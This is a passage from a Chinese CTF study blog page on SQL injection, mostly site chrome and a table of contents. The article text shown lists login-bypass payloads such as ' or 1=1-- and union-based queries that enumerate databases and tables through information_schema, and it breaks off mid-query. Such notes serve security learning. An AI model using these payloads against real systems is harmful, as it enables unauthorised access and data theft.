<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>SQL注入 | Lazzaro</title><meta name="description" content="万能密码123456789admin&#x27; --admin&#x27; #admin&#x27;&#x2F;\*&#x27; or 1&#x3D;1--&#x27; or 1&#x3D;1#&#x27; or 1&#x3D;1&#x2F;*&#x27;) or &#x27;1&#x27;&#x3D;&#x27;1--&#x27;) or (&#x27;1&#x27;&#x3D;&#x27;1-- 1&#x27;^1#       (False注入) ​"><meta property="og:type" content="article"><meta property="og:title" content="SQL注入"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="万能密码123456789admin&#x27; --admin&#x27; #admin&#x27;&#x2F;\*&#x27; or 1&#x3D;1--&#x27; or 1&#x3D;1#&#x27; or 1&#x3D;1&#x2F;*&#x27;) or &#x27;1&#x27;&#x3D;&#x27;1--&#x27;) or (&#x27;1&#x27;&#x3D;&#x27;1-- 1&#x27;^1#       (False注入) ​"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQL%E7%9B%B2%E6%B3%A821.png"><meta property="article:published_time" content="2020-05-15T17:43:10.000Z"><meta property="article:modified_time" content="2024-11-24T05:49:42.929Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="SQL"><meta property="article:tag" content="注入"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/SQL%E7%9B%B2%E6%B3%A821.png"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF弱鸡自进阶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="搜索"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">总览</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">汇总</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">类别</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">关键词</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">来留个言 👉👉👉</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">类别</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">49</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">关键词云</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020赛</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021赛</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022赛</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023赛</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024赛</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">内网</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">反序列化</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">反编译</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">反调试</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">取证</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">后量子密码</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">命令行</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">图像</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">块密码</a> <a href="/tags/%E5%A0%86/" style="font-size:13px">堆</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">密码</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">提权</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">文件上传</a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">曲线</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">栈</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">格密码</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">格式化字符串</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">注入</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">流密码</a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">流量</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">混淆</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">渗透</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">离散对数</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">算法</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">绕过</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">编码</a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">脚本</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">自动化</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">逃逸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">隐写</a></div></div><div class="widget"><h3 class="widget-title">汇总</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">十二月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">十一月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">九月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">二月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">一月 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">八月 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">二月 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">十一月 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">手注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%B3%A8%E5%85%A5%E6%AD%A5%E9%AA%A4%EF%BC%88%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">正常注入步骤（联合查询）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">2.2.</span> <span class="toc-text">无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.2.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#limit%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.3.</span> <span class="toc-text">limit注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#update%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.4.</span> <span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#insert%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.5.</span> <span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#order-by%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.6.</span> <span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#group-by%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.7.</span> <span class="toc-text">group by注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">二次注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1urldecode%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text">二次urldecode注入</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.</span> <span class="toc-text">文件操作</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rogue-Mysql-Server"><span class="toc-number">2.7.</span> <span class="toc-text">Rogue Mysql Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Quine"><span class="toc-number">2.8.</span> <span class="toc-text">Quine</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%EF%BC%88bypass%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">绕过（bypass）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.1.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="toc-number">3.2.</span> <span class="toc-text">单双引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">3.3.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%89%E5%8F%B7"><span class="toc-number">3.4.</span> <span class="toc-text">等号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%8F%B7"><span class="toc-number">3.5.</span> <span class="toc-text">分号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#and-or"><span class="toc-number">3.6.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#union"><span class="toc-number">3.7.</span> <span class="toc-text">union</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#select"><span class="toc-number">3.8.</span> <span class="toc-text">select</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-number">3.9.</span> <span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#where"><span class="toc-number">3.10.</span> <span class="toc-text">where</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">3.11.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ascii"><span class="toc-number">3.12.</span> <span class="toc-text">ascii</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#substr"><span class="toc-number">3.13.</span> <span class="toc-text">substr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#as"><span class="toc-number">3.14.</span> <span class="toc-text">as</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#if"><span class="toc-number">3.15.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by"><span class="toc-number">3.16.</span> <span class="toc-text">order by</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">3.17.</span> <span class="toc-text">其他关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.18.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">3.19.</span> <span class="toc-text">数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">3.20.</span> <span class="toc-text">mysql系统库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">3.21.</span> <span class="toc-text">sys系统库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%EF%BC%88or-column-%E8%A2%AB%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="toc-number">3.22.</span> <span class="toc-text">无列名注入（or &#x2F; column 被过滤）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8C%E6%AD%A5%E8%A1%A8%E6%95%B0%E6%8D%AE-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">3.23.</span> <span class="toc-text">同步表数据 - 主从复制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.24.</span> <span class="toc-text">远程连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87"><span class="toc-number">3.25.</span> <span class="toc-text">参考文</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5%EF%BC%88OOB%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">DNS带外注入（OOB）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF"><span class="toc-number">5.</span> <span class="toc-text">UDF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQLite3"><span class="toc-number">6.</span> <span class="toc-text">SQLite3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQL"><span class="toc-number">7.</span> <span class="toc-text">NoSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB"><span class="toc-number">7.1.</span> <span class="toc-text">MongoDB</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XPath"><span class="toc-number">8.</span> <span class="toc-text">XPath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">常用脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">9.1.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="toc-number">9.2.</span> <span class="toc-text">时间盲注</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-SQL注入" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">SQL注入</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/" class="article-date"><time datetime="2020-05-15T17:43:10.000Z" itemprop="datePublished">2020-05-16</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/SQL/" rel="tag">SQL</a>, <a class="article-tag-link-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/" class="leancloud_visitors" data-flag-title="SQL注入"><span class="leancloud-visitors-count">∞</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/#comments" class="article-comment-link">评论</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; --</span><br><span class="line">admin&#x27; #</span><br><span class="line">admin&#x27;/\*</span><br><span class="line">&#x27; or 1=1--</span><br><span class="line">&#x27; or 1=1#</span><br><span class="line">&#x27; or 1=1/*</span><br><span class="line">&#x27;) or &#x27;1&#x27;=&#x27;1--</span><br><span class="line">&#x27;) or (&#x27;1&#x27;=&#x27;1-- </span><br><span class="line">1&#x27;^1#       (False注入)</span><br></pre></td></tr></table></figure><p>​</p><h3 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h3><h4 id="正常注入步骤（联合查询）"><a href="#正常注入步骤（联合查询）" class="headerlink" title="正常注入步骤（联合查询）"></a>正常注入步骤（联合查询）</h4><p><strong>查库名-&gt;查表名-&gt;查列名（字段名）-&gt;查值（数据）</strong></p><ul><li><p>字段数量猜解</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>判断页面回显数据字段位置</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,x... <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li><li><p>数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database()</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL8新特性(&gt;8.0.21)</span></span><br><span class="line"><span class="keyword">table</span> information_schema.TABLESPACES_EXTENSIONS</span><br></pre></td></tr></table></figure></li><li><p>表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name),<span class="number">4</span>,xxxx <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><ul><li><p>union查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA<span class="operator">=</span>database();   <span class="comment">/* 列出所有用户自定义数据库中的表 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL 4版本时用version=9，MySQL 5版本时用version=10</span></span><br><span class="line"><span class="keyword">UNION</span> 